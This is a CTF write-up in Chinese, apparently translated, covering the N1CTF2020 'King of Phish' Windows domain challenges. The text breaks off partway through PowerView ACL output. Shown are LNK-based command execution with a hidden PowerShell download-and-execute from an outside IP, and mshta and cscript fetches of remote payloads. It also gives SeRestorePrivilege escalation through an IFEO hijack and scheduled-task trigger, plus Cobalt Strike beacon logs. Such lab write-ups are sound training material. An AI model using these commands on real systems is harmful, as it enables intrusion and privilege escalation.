# N1CTF2020 Pentest King of phish
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 前言：
N1CTF2020中的几道域题目考点很好，拿来和师傅们分享下，希望能给师傅们一点帮助
## The King Of Phish (Victim Bot)
lnk命令执行，测试后发现携带参数不能超过一个`可以把空格替换成tab就执行了，cs起一个web
    C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://132.232.82.54:12345/a1'))"
拿到回来的shell
    type c:\users\usera\desktop\flag.txt
看了眼wp 还有很多方法，学习了
    C:\Windows\System32\cmd.exe /c type %USERPROFILE%\Desktop\flag.txt
    C:\Windows\System32\cmd.exe /k"whoami"
    C:\Windows\System32\mshta.exe http://xxx.xxx.xxx.xxx:8080/1.hta
    C:\Windows\System32\cscript.exe \\xxx.xxx.xxx.xxx\public\test.vbs
## The King Of Phish (UserA-PC)
### 预期解：
SeRestorePrivilege提权
可以在三好学生博客中看到如下内容
大概意思是使用SeRestore修改注册表，劫持高权限进程启动的进程从而启动我们自己的shell
而且在他的github中也有cpp
https://github.com/3gstudent/Homework-of-C-Language/blob/master/EnableSeRestorePrivilege.cpp
下载下来本地修改se_restore_priv函数使其修改IFEO，劫持wsqmcons.exe
有几个坑点：需要在windows下用vstudio编译，编译器需改为MT，远程是x86的exp才能打通。我打了5个多小时x64.
有一个地方有报错但是不影响
编译上传 上传shell
需要注意的是我们这里劫持的是计划任务，使用powerview发现此用户对于计划任务也可以主动的执行
    beacon> shell powershell Import-Module ./powerview.ps1;"Get-ScheduledTask|? TaskName -eq Consolidator |select -exp SecurityDescriptor|ConvertFrom-SddlString|select -exp DiscretionaryAcl|Format-Table -AutoSize"
    [*] Tasked beacon to run: powershell Import-Module ./powerview.ps1;"Get-ScheduledTask|? TaskName -eq Consolidator |select -exp SecurityDescriptor|ConvertFrom-SddlString|select -exp DiscretionaryAcl|Format-Table -AutoSize"
    [+] host called home, sent: 226 bytes
    [+] received output:
    NT AUTHORITY\Authenticated Users: AccessAllowed (GenericExecute, GenericRead)
    NT AUTHORITY\SYSTEM: AccessAllowed (ChangePermissions, CreateDirectories, Delete, DeleteSubdirectoriesAndFiles, ExecuteKey, FullControl, FullControl, FullControl, FullControl, FullControl, GenericAll, GenericExecute, GenericRead, GenericWrite, ListDirectory, Modify, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, TakeOwnership, Traverse, Write, WriteAttributes, WriteData, WriteExtendedAttributes, WriteKey)
    BUILTIN\Administrators: AccessAllowed (ChangePermissions, CreateDirectories, Delete, DeleteSubdirectoriesAndFiles, ExecuteKey, FullControl, FullControl, FullControl, FullControl, FullControl, GenericAll, GenericExecute, GenericRead, GenericWrite, ListDirectory, Modify, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, TakeOwnership, Traverse, Write, WriteAttributes, WriteData, WriteExtendedAttributes, WriteKey)
    NT AUTHORITY\Authenticated Users: AccessAllowed (GenericExecute, GenericRead)
    schtasks /Run /TN "\Microsoft\Windows\Customer Experience Improvement Program\Consolidator"
手动触发Consolidator
完整过程
    beacon> shell getflag.exe
    [*] Tasked beacon to run: test.exe
    [+] host called home, sent: 39 bytes
    [+] received output:
    whoami:
    N1CTF\usera
    whoami /priv
    SeRestorePrivilege Enabled
    SeChangeNotifyPrivilege Enabled by default
    SeIncreaseWorkingSetPrivilege Disabled
    [+] Key set
    beacon> shell schtasks /Run /TN "\Microsoft\Windows\Customer Experience Improvement Program\Consolidator"
    [*] Tasked beacon to run: schtasks /Run /TN "\Microsoft\Windows\Customer Experience Improvement Program\Consolidator"
    [+] host called home, sent: 122 bytes
    [+] received output:
    SUCCESS: Attempted to run the scheduled task "\Microsoft\Windows\Customer Experience Improvement Program\Consolidator".
拿到system权限
拿flag
### 使用资源约束委派提权
首先使用powerview收集域信息
    beacon> shell powershell Import-module ./powerview.ps1;Get-DomainUser -Identity USERA-pc -Properties objectsid
    [*] Tasked beacon to run: powershell Import-module ./powerview.ps1;Get-DomainUser -Identity USERA-pc -Properties objectsid
    [+] host called home, sent: 127 bytes
    beacon> shell powershell Import-module ./powerview.ps1;Get-DomainUser -Identity usera -Properties objectsid
    [*] Tasked beacon to run: powershell Import-module ./powerview.ps1;Get-DomainUser -Identity usera -Properties objectsid
    [+] host called home, sent: 124 bytes
    [+] received output:
    objectsid
    ---------    S-1-5-21-3860493963-3742860931-3732056798-1105
    beacon> shell powershell Import-module ./powerview.ps1;"Get-DomainObjectAcl -Identity USERA-PC | ?{$_.SecurityIdentifier -match 'S-1-5-21-3860493963-3742860931-3732056798-1105'}"
    [*] Tasked beacon to run: powershell Import-module ./powerview.ps1;"Get-DomainObjectAcl -Identity USERA-PC | ?{$_.SecurityIdentifier -match 'S-1-5-21-3860493963-3742860931-3732056798-1105'}"
    [+] host called home, sent: 195 bytes
    [+] received output:
    ObjectDN : CN=USERA-PC,CN=Computers,DC=n1ctf,DC=lab
    ObjectSID : S-1-5-21-3860493963-3742860931-3732056798-1106
    ActiveDirectoryRights : WriteProperty
    ObjectAceFlags : ObjectAceTypePresent, InheritedObjectAceTypePresent
    ObjectAceType : 5f202010-79a5-11d0-9020-00c04fc2d4cf
    InheritedObjectAceType : bf967a86-0de6-11d0-a285-00aa003049e2
    BinaryLength : 72
    AceQualifier : AccessAllowed
    IsCallback : False
    OpaqueLength : 0
    AccessMask : 32
    SecurityIdentifier : S-1-5-21-3860493963-3742860931-3732056798-1105
    AceType : AccessAllowedObject
    AceFlags : None
    IsInherited : False
    InheritanceFlags : None
    PropagationFlags : None
    AuditFlags : None
    ObjectDN : CN=USERA-PC,CN=Computers,DC=n1ctf,DC=lab
    ObjectSID : S-1-5-21-3860493963-3742860931-3732056798-1106
    ActiveDirectoryRights : WriteProperty
    ObjectAceFlags : ObjectAceTypePresent, InheritedObjectAceTypePresent
    ObjectAceType : bf967950-0de6-11d0-a285-00aa003049e2
    InheritedObjectAceType : bf967a86-0de6-11d0-a285-00aa003049e2
    BinaryLength : 72
    AceQualifier : AccessAllowed
    IsCallback : False
    OpaqueLength : 0
    AccessMask : 32
    SecurityIdentifier : S-1-5-21-3860493963-3742860931-3732056798-1105
    AceType : AccessAllowedObject
    AceFlags : None
    IsInherited : False
    InheritanceFlags : None
    PropagationFlags : None
    AuditFlags : None
    ObjectDN : CN=USERA-PC,CN=Computers,DC=n1ctf,DC=lab
    ObjectSID : S-1-5-21-3860493963-3742860931-3732056798-1106
    ActiveDirectoryRights : WriteProperty
    ObjectAceFlags : ObjectAceTypePresent, InheritedObjectAceTypePresent
    ObjectAceType : bf967953-0de6-11d0-a285-00aa003049e2
    InheritedObjectAceType : bf967a86-0de6-11d0-a285-00aa003049e2
    BinaryLength : 72
    AceQualifier : AccessAllowed
    IsCallback : False
    OpaqueLength : 0
    AccessMask : 32
    SecurityIdentifier : S-1-5-21-3860493963-3742860931-3732056798-1105
    AceType : AccessAllowedObject
    AceFlags : None
    IsInherited : False
    InheritanceFlags : None
    PropagationFlags : None
    AuditFlags : None
    ObjectDN : CN=USERA-PC,CN=Computers,DC=n1ctf,DC=lab
    ObjectSID : S-1-5-21-3860493963-3742860931-3732056798-1106
    ActiveDirectoryRights : WriteProperty
    ObjectAceFlags : ObjectAceTypePresent, InheritedObjectAceTypePresent
    ObjectAceType : 3e0abfd0-126a-11d0-a060-00aa006c33ed
    InheritedObjectAceType : bf967a86-0de6-11d0-a285-00aa003049e2
    BinaryLength : 72
    AceQualifier : AccessAllowed